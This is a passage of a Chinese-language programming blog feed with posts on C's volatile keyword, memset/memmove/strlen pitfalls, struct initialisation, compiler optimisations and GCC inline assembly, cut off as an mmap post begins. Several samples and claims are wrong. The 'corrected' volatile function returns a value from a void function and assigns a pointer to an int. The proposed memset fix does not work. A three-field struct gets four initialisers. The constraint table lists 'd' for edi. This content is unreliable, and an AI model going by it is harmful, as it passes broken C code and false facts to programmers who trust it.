class="hljs-number">1</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>上述程序的本意是希望ISR_2中断产生时，在main函数中调用dosomething函数，但是，由于编译器判断在main函数里面没有修改过i，因此可能只执行一次对从i到某寄存器的读操作，然后每次if判断都只使用这个寄存器里面的“i副本”，导致dosomething永远也不会被调用。如果将变量加上volatile修饰，则编译器保证对此变量的读写操作都不会被优化（肯定执行）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span>  *output = (<span class="hljs-type">unsigned</span>  <span class="hljs-type">int</span> *)<span class="hljs-number">0xff800000</span>;<span class="hljs-comment">//定义一个IO端口；</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>      <span class="hljs-type">int</span> i;<br>      <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt; <span class="hljs-number">10</span>;i++)&#123;<br><br>         *output = i;<br>      &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>没有使用<code>volatile</code>关键字，则该代码会被优化为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span>  <span class="hljs-title function_">init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>      *output = <span class="hljs-number">9</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>所以我们需要使用<code>volatile</code>关键字，来告诉编译器不要优化。</p><h2 id="小练习"><a href="#小练习" class="headerlink" title="小练习"></a>小练习</h2><p>下面函数有什么问题？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">test</span> <span class="hljs-params">(<span class="hljs-type">int</span> <span class="hljs-keyword">volatile</span>* a)</span><br>&#123;<br>      <span class="hljs-keyword">return</span> (*a) * (*a);<br>&#125;<br></code></pre></td></tr></table></figure><p>上面有可能a会被其他的线程所改变。更正：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">test</span> <span class="hljs-params">(<span class="hljs-type">int</span> <span class="hljs-keyword">volatile</span>* a)</span><br>&#123;<br>      <span class="hljs-type">int</span> b = a;<br>      <span class="hljs-keyword">return</span> b * b;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>通过上面的代码，<code>volatile</code>关键字似乎不仅仅是阻止，编译器优化关于<strong>寄存器分配</strong>的优化。由第二段代码可知，<code>volatile</code>还可以阻止编译器进行<strong>死代码消除</strong>的优化。<strong>是否可以认为，只要添加了该关键字，就可以认为编译器不会随便对该对象进行优化。</strong></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.cnblogs.com/zhuangquan/p/15057897.html">https://www.cnblogs.com/zhuangquan/p/15057897.html</a></p>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
      <category>语法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C中的字符串函数</title>
    <link href="/2023/11/09/C%E4%B8%AD%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0/"/>
    <url>/2023/11/09/C%E4%B8%AD%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<p>讲讲C库中的字符串函数需要特别注意的地方</p><span id="more"></span><h2 id="memset"><a href="#memset" class="headerlink" title="memset()"></a>memset()</h2><p>这个函数我们一般用来初始化一段内存空间,将已开辟内存空间 s 的首 n 个字节的值设为值 c。<strong>（注意：会去修改内存得值，如果内存是只读，使用memset会出错）</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">memset</span><span class="hljs-params">(<span class="hljs-type">void</span>* s ,<span class="hljs-type">int</span> c, <span class="hljs-type">size_t</span> n)</span><br></code></pre></td></tr></table></figure><p>需要特别注意：<strong>memset是以byte来填充的，也就是一个字节（8bit）一个单位来填充。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> arr [<span class="hljs-number">10</span>];<br><span class="hljs-type">int</span> a = <span class="hljs-number">1</span>;<br><span class="hljs-built_in">memset</span>(arr,a,<span class="hljs-number">10</span>);<br>pritnf(<span class="hljs-string">&quot;%d\n&quot;</span>,arr[<span class="hljs-number">0</span>]);<br></code></pre></td></tr></table></figure><p>如果你运行这段代码你会发现其不会输出<strong>1</strong>，这是因为<strong>memset是以byte来填充的，也就是一个字节（8bit）一个单位来填充。</strong>。</p><p>因为int是4个字节，因此再int类型中1的表现形式为“00000000000000000000000000000001”，然后将这32位填充1个byte中，高位被舍弃，也就是“00000001”，然后再填充一次就变成“0000000100000001”。那么array[0]其实在内存中存储的就是“00000001000000010000000100000001”。</p><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>将<code>int a</code>改成<code>char a</code>来解决问题。</p><h2 id="memmove-和memcpy"><a href="#memmove-和memcpy" class="headerlink" title="memmove()和memcpy()"></a>memmove()和memcpy()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">memmove</span><span class="hljs-params">(<span class="hljs-type">void</span> *str1, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *str2, <span class="hljs-type">size_t</span> n)</span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">memcpy</span><span class="hljs-params">(<span class="hljs-type">void</span> *dest, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *src, <span class="hljs-type">size_t</span> n)</span><br></code></pre></td></tr></table></figure><p>这两个函数非常类似，但是我们在使用时最好有线使用memmove()，因为其更加安全。</p><p><strong>如果目标区域和源区域有重叠的话，memmove() 能够保证源串在被覆盖之前将重叠区域的字节拷贝到目标区域中，复制后源区域的内容会被更改。如果目标区域与源区域没有重叠，则和 memcpy() 函数功能相同。</strong></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>memmove()和memcpy()，优先使用memmove()</p><h2 id="sizeof-和strlen"><a href="#sizeof-和strlen" class="headerlink" title="sizeof()和strlen()"></a>sizeof()和strlen()</h2><p>这两者的比较，首先在于sizeof()<strong>并非一个函数</strong>，而是一个操作符，但是strlen()是一个函数。</p><p>其次sizeof()所计算的时类型的长度，而strlen()所计算的是变量的长度。<br>sizeof()会将字符串末尾的<code>&#39;0&#39;</code>计算进来，但是strlen()只会截止到<code>\0</code>，并且不会将<code>\0</code>算作一个字符</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> arr [<span class="hljs-number">3</span>] = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>&#125;;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,<span class="hljs-built_in">strlen</span>(arr));<br></code></pre></td></tr></table></figure><p>其会输出<code>1</code>，既不是<strong>2</strong>，也不是<strong>3</strong></p>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
      <category>函数</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C中结构体的四种初始化方法</title>
    <link href="/2023/11/09/C%E4%B8%AD%E7%BB%93%E6%9E%84%E4%BD%93%E7%9A%84%E5%9B%9B%E7%A7%8D%E5%88%9D%E5%A7%8B%E5%8C%96%E6%96%B9%E6%B3%95/"/>
    <url>/2023/11/09/C%E4%B8%AD%E7%BB%93%E6%9E%84%E4%BD%93%E7%9A%84%E5%9B%9B%E7%A7%8D%E5%88%9D%E5%A7%8B%E5%8C%96%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h2 id="C中结构体的四种初始化方法说明"><a href="#C中结构体的四种初始化方法说明" class="headerlink" title="C中结构体的四种初始化方法说明"></a>C中结构体的四种初始化方法说明<br><span id="more"></span></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">man</span> &#123;</span><br>    <span class="hljs-type">int</span> a;<br>    <span class="hljs-type">char</span> b;<br>    <span class="hljs-type">double</span> c;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="第一种，顺序初始化"><a href="#第一种，顺序初始化" class="headerlink" title="第一种，顺序初始化"></a>第一种，顺序初始化</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">man</span> <span class="hljs-title">saf</span> =</span> &#123;<br>    <span class="hljs-number">1</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-number">12</span>,<span class="hljs-number">32</span><br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="第二种，定义后逐个赋值"><a href="#第二种，定义后逐个赋值" class="headerlink" title="第二种，定义后逐个赋值"></a>第二种，定义后逐个赋值</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">man</span> <span class="hljs-title">fd</span>;</span><br>fd.a = <span class="hljs-number">1</span>;<br>fd.b = <span class="hljs-string">&#x27;a&#x27;</span>;<br>fd.c = <span class="hljs-number">123.213</span>;<br></code></pre></td></tr></table></figure><h1 id="第三种，C语言风格乱序初始化"><a href="#第三种，C语言风格乱序初始化" class="headerlink" title="第三种，C语言风格乱序初始化"></a>第三种，C语言风格乱序初始化</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">man</span> <span class="hljs-title">er</span> =</span> &#123;<br>    .b = <span class="hljs-string">&#x27;f&#x27;</span>,<br>    .a = <span class="hljs-number">12</span>,<br>    .c = <span class="hljs-number">12313.231</span><br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="第四种，C-风格定义时乱序赋值"><a href="#第四种，C-风格定义时乱序赋值" class="headerlink" title="第四种，C++风格定义时乱序赋值"></a>第四种，C++风格定义时乱序赋值</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">man</span> <span class="hljs-title">lj</span> =</span> &#123;<br>    a: <span class="hljs-number">1</span>,<br>    c: <span class="hljs-number">123.123</span>,<br>    b: <span class="hljs-string">&#x27;f&#x27;</span>,<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
      <category>语法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>编译器的优化方法</title>
    <link href="/2023/11/09/%E7%BC%96%E8%AF%91%E5%99%A8%E7%9A%84%E4%BC%98%E5%8C%96%E6%96%B9%E6%B3%95/"/>
    <url>/2023/11/09/%E7%BC%96%E8%AF%91%E5%99%A8%E7%9A%84%E4%BC%98%E5%8C%96%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>常见的编译器优化方法</p><span id="more"></span><h2 id="寄存器分配"><a href="#寄存器分配" class="headerlink" title="寄存器分配"></a>寄存器分配</h2><p>寄存器分配是指，编译器将内存中的值缓存在寄存器中，之后一直用访问寄存器来代表对这个内存的访问的。</p><p>由于计算机中内存访问速度远远不如寄存器的访问速度，所以比编译器一般会把变量拷贝至寄存器中以提高访问速度。但是寄存器的数量是有限的。</p><p>新型 x86 处理器提供以下可以通过编译器进行分配的寄存器：</p><p>所有 x64 处理器提供 16 个 64 位的通用寄存器、8 个 80 位的浮点寄存器和至少 16 个矢量寄存器（每个矢量寄存器至少 128 位）。</p><h2 id="常量折叠-Constant-Folding"><a href="#常量折叠-Constant-Folding" class="headerlink" title="常量折叠 (Constant Folding)"></a>常量折叠 (Constant Folding)</h2><p>常量折叠，又称常量传播 (Constant Propagation)，如果一个表达式可以确定为常量，在他的下一个定义 (Definition) 前，可以进行常量传播。常量，就是说在编译期时，能够直接计算出结果（这个结果往往是常量）的变量，将被编译器由直接计算出的结果常量来替换这个变量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> x = <span class="hljs-number">1</span>;<br><span class="hljs-type">int</span> y = x;  <span class="hljs-comment">// x = 1, =&gt; y = 1</span><br>x = <span class="hljs-number">3</span>;<br><span class="hljs-type">int</span> z = <span class="hljs-number">2</span> * y;   <span class="hljs-comment">// z =&gt; 2 * y = 2 * 1 = 2</span><br><span class="hljs-type">int</span> y2 = x * <span class="hljs-number">2</span>;  <span class="hljs-comment">// x = 3, =&gt; y2 = 6</span><br></code></pre></td></tr></table></figure><p>这段代码在编译期间即可被转换为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> x = <span class="hljs-number">1</span>;<br><span class="hljs-type">int</span> y = <span class="hljs-number">1</span>;<br>x = <span class="hljs-number">3</span>;<br><span class="hljs-type">int</span> z = <span class="hljs-number">2</span>;<br><span class="hljs-type">int</span> y2 = <span class="hljs-number">6</span>;<br></code></pre></td></tr></table></figure><p>也就是直接使用等号右边的常量值来代替左边的’变量’</p><h2 id="死代码消除-Deadcode-Elimination"><a href="#死代码消除-Deadcode-Elimination" class="headerlink" title="死代码消除 (Deadcode Elimination)"></a>死代码消除 (Deadcode Elimination)</h2><p>没有使用到的代码将会被编译器删除</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">double</span> <span class="hljs-title function_">fun</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> x = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> y = <span class="hljs-number">2</span>;<br>    <span class="hljs-type">double</span> xx = <span class="hljs-number">1231.2312</span>;<br>    <span class="hljs-keyword">return</span> xx;<br>&#125;<br></code></pre></td></tr></table></figure><p>该代码将会被转换为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">double</span> <span class="hljs-title function_">fun</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">double</span> xx = <span class="hljs-number">1231.2312</span>;<br>    <span class="hljs-keyword">return</span> xx;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="公共子表达式删除"><a href="#公共子表达式删除" class="headerlink" title="公共子表达式删除"></a>公共子表达式删除</h2><p>公共子表达式消除是说，如果一个表达式E已经计算过了，并且从先前的计算到现在的E中的变量都没有发生变化，那么E的此次出现就成为了公共子表达式，因此，编译器可判断其不需要再次进行计算浪费性能。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://learn.microsoft.com/zh-cn/archive/msdn-magazine/2015/may/compilers-what-every-programmer-should-know-about-compiler-optimizations-part-2">编译器使用的寄存器分配优化</a></p><p><a href="https://zhuanlan.zhihu.com/p/381490718">https://zhuanlan.zhihu.com/p/381490718</a></p><p><a href="https://oi-wiki.org/lang/optimizations/">https://oi-wiki.org/lang/optimizations/</a></p>]]></content>
    
    
    <categories>
      
      <category>编译器</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C语言中的内嵌汇编</title>
    <link href="/2023/11/09/C%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84%E5%86%85%E5%B5%8C%E6%B1%87%E7%BC%96/"/>
    <url>/2023/11/09/C%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84%E5%86%85%E5%B5%8C%E6%B1%87%E7%BC%96/</url>
    
    <content type="html"><![CDATA[<p>C语言中的内嵌汇编语法解释</p><span id="more"></span><h1 id="内嵌语法格式"><a href="#内嵌语法格式" class="headerlink" title="内嵌语法格式"></a>内嵌语法格式</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">asm</span>(<br>    内嵌汇编指令<br>    ：输出操作数<br>    ：输入操作数<br>    ：破坏描述<br>);<br></code></pre></td></tr></table></figure><p>其中内嵌汇编指令是必不可少的，但可以为空。其他3部分根据程序需要可选。如果只有内嵌汇编指令时，后面的“:”可以省略。如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">asm</span>(<br>    <span class="hljs-string">&quot;break&quot;</span><br>);<br><br>__asm__(<br>    <span class="hljs-string">&quot;break&quot;</span><br>);<br></code></pre></td></tr></table></figure><div class="note note-info">            <p>asm是__asm__的别名，所以二者都是可以使用的，但是asm是gcc的扩展。为了保证可移植性，最好使用<code>__asm__</code></p>          </div><p>关于<code>:</code>的省略问题，只有<strong>内嵌汇编指令</strong>，而后面都没有时，可以省略所有<code>:</code>。内嵌汇编程序中如果没有输出部分，但是有输入部分，那么输出部分的“:”不能省略。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span><span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;movl %1,%%esp\n\t&quot;</span>     <span class="hljs-comment">/* set task[pid].thread.sp to esp */</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pushl %1\n\t&quot;</span>             <span class="hljs-comment">/* push ebp */</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pushl %0\n\t&quot;</span>             <span class="hljs-comment">/* push task[pid].thread.ip */</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;ret\n\t&quot;</span>                 <span class="hljs-comment">/* pop task[pid].thread.ip to eip */</span></span><br><span class="hljs-params">        :</span><br><span class="hljs-params">        : <span class="hljs-string">&quot;c&quot;</span> (task[pid].thread.ip),<span class="hljs-string">&quot;d&quot;</span> (task[pid].thread.sp)    <span class="hljs-comment">/* input c or d mean %ecx/%edx*/</span></span><br><span class="hljs-params">    )</span>;<br><br><br><span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;move $31,%0\n\t&quot;</span> <br>    :        <span class="hljs-comment">/*此处的：不能省略*/</span><br>    :<span class="hljs-string">&quot;r&quot;</span>(a)<br>);<br></code></pre></td></tr></table></figure><ol><li>每条指令都以<code>&quot; &quot;</code>为单位。多条指令可以使用<code>&quot; ;&quot;</code>号、<code>\n\t</code>或者换行来分割。</li><li>asm模板里面可以使用<code>/**/</code>或者<code>//</code>添加注释。</li><li>使用寄存器时，要在前面加上<code>$</code></li><li><code>&quot;__volatile__&quot;</code>表示编译器不要优化代码，后面的指令保留原样，<code>&quot;volatile&quot;</code>是它的别名。括号里面是汇编指令。</li></ol><h2 id="输入操作数和输出操作数"><a href="#输入操作数和输出操作数" class="headerlink" title="输入操作数和输出操作数"></a>输入操作数和输出操作数</h2><p> 内嵌汇编中的操作数包括输出操作数和输入操作数，输出操作数和输入操作数里的每一个操作数都由<strong>一个约束字符串</strong>和一个<strong>带括号的c语言表达式或变量</strong>组成，比如<code>“r”(src)</code>。多个操作数之间使用“,”分割。内嵌汇编指令中使用%num的形式依次表示每一个操作数，<strong>num从0开始</strong>。比如：</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;daddu %0,%1,%2\n\t&quot;</span><br>    :<span class="hljs-string">&quot;=r&quot;</span>(ret)         <span class="hljs-comment">/* 输出操作数，也是第0个操作数%0 */</span><br>    :<span class="hljs-string">&quot;r&quot;</span>(a),<span class="hljs-string">&quot;r&quot;</span>(b)     <span class="hljs-comment">/* 输入操作数，也是第1个操作数和第2个操作数 %1,%2 */</span><br>);<br></code></pre></td></tr></table></figure><h2 id="破坏描述部分"><a href="#破坏描述部分" class="headerlink" title="破坏描述部分"></a>破坏描述部分</h2><p> 所谓的破坏描述就是告诉gcc，哪些寄存器是会在这个内联汇编中被改变。gcc以此做好防护，防止出现导致程序出错或致命异常。一般是寄存器的名字或者是<code>memory</code>和<code>cc</code>. <code>cc</code>的作用是表示汇编代码修改标致寄存器. </p><p><strong>其实就是告诉编译器我们在内联汇编中使用了哪些寄存器或内存</strong></p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;dadd %0,%1,%2\n\t&quot;</span><br>    <span class="hljs-string">&quot;move $31,%0\n\t&quot;</span><br>    :<span class="hljs-string">&quot;=g&quot;</span>(ret)<br>    :<span class="hljs-string">&quot;r&quot;</span>(a),<span class="hljs-string">&quot;r&quot;</span>(b)<br>    :<span class="hljs-string">&quot;$31&quot;</span><br>);<br></code></pre></td></tr></table></figure><p> 上述代码中，<code>&quot;%31&quot;</code>就是告诉gcc，<code>$31</code>遭到了破坏。</p><h2 id="有名操作数和指定操作数"><a href="#有名操作数和指定操作数" class="headerlink" title="有名操作数和指定操作数"></a>有名操作数和指定操作数</h2><p>  从gcc的3.1版本之后，内嵌汇编支持有名操作数。就是可以在内嵌汇编中为输入操作数、输出操作数取名字，名字形式是[name]，放在每个操作数的前面，然后汇编程序模板里面就可以使用%[name]的形式，而不是上面%num形式。例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;daddu %[out],%[in1],%[in2]\n\t&quot;</span><br>     :[out]<span class="hljs-string">&quot;=g&quot;</span>(ret)<br>     :[in1]<span class="hljs-string">&quot;r&quot;</span>(a),[in2]<span class="hljs-string">&quot;r&quot;</span>(b)<br>);<br></code></pre></td></tr></table></figure><p>当然我们也可以只给一个操作数命令</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;daddu %[out],%1,%2\n\t&quot;</span><br>    :[out]<span class="hljs-string">&quot;=g&quot;</span>(ret)<br>    :<span class="hljs-string">&quot;r&quot;</span>(a),<span class="hljs-string">&quot;r&quot;</span>(b)<br>);<br></code></pre></td></tr></table></figure><h2 id="内联汇编的奇特用法"><a href="#内联汇编的奇特用法" class="headerlink" title="内联汇编的奇特用法"></a>内联汇编的奇特用法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">register</span> <span class="hljs-type">int</span> sys_id <span class="hljs-title function_">asm</span><span class="hljs-params">(<span class="hljs-string">&quot;$RAX&quot;</span>)</span> = <span class="hljs-number">5001</span>;<br><span class="hljs-comment">//将RAX寄存器中的值设置为5001</span><br></code></pre></td></tr></table></figure><h2 id="约束描述符"><a href="#约束描述符" class="headerlink" title="约束描述符"></a>约束描述符</h2><p>输出约束必须以“ &#x3D; ”（覆盖现有值的变量）或“ + ”（读取和写入时）开头。</p><p>前面我们提到了<code>=r</code> <code>+r</code>。这些 <code>=</code> <code>+</code> 都是约束描述符。 约束字符就是输入操作数和输出操作数前面的修饰符。约束字符可以说明操作数是否可以在寄存器中，以及哪种寄存器；操作数是否可以是内存引用，以及哪种地址；操作数是否可以是立即常数，以及它可能具有的值。本节介绍常用的约束字符信息。</p><h3 id="常用的约束描述符"><a href="#常用的约束描述符" class="headerlink" title="常用的约束描述符"></a>常用的约束描述符</h3><ol><li><p>“b” 将输入变量放入ebx   </p></li><li><p>“c” 将输入变量放入ecx</p></li><li><p>“d” 将输入变量放入edx</p></li><li><p>“s” 将输入变量放入esi</p></li><li><p>“d” 将输入变量放入edi</p></li><li><p>“q” 将输入变量放入eax，ebx，ecx，edx中的一个</p></li><li><p>“r” 将输入变量放入通用寄存器，也就是eax，ebx，ecx，<br>edx，esi，edi中的一个</p></li><li><p>“A” 把eax和edx合成一个64 位的寄存器(use long longs)</p></li><li><p>内存 “m” 内存变量</p></li><li><p>“o” 操作数为内存变量，但是其寻址方式是偏移量类型，也即是基址寻址，或者是基址加变址寻址</p></li><li><p>“V” 操作数为内存变量，但寻址方式不是偏移量类型</p></li><li><p>“ “ 操作数为内存变量，但寻址方式为自动增量</p></li><li><p>“p” 操作数是一个合法的内存地址（指针）</p></li></ol><p><strong>更多的选项可以去GCC官方手册上查找</strong></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p> <a href="https://gcc.gnu.org/onlinedocs/gcc/Extended-Asm.html">GCC官方手册</a></p><p> <a href="https://www.linuxprobe.com/gcc-how-to.html">https://www.linuxprobe.com/gcc-how-to.html</a></p><p> <a href="http://www.ibiblio.org/gferg/ldp/GCC-Inline-Assembly-HOWTO.html#s4">http://www.ibiblio.org/gferg/ldp/GCC-Inline-Assembly-HOWTO.html#s4</a></p><p> <a href="https://blog.csdn.net/weixin_38669561/article/details/105192200?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-3.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-3.control">https://blog.csdn.net/weixin_38669561/article/details/105192200?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-3.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-3.control</a></p><p> <a href="https://blog.csdn.net/yxc135/article/details/11537763">https://blog.csdn.net/yxc135/article/details/11537763</a></p>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
      <category>语法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux内存映射函数mmap函数详解</title>
    <link href="/2023/11/09/Linux%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84%E5%87%BD%E6%95%B0mmap%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3/"/>
    <url>/2023/11/09/Linux%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84%E5%87%BD%E6%95%B0mmap%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3/</url>
    
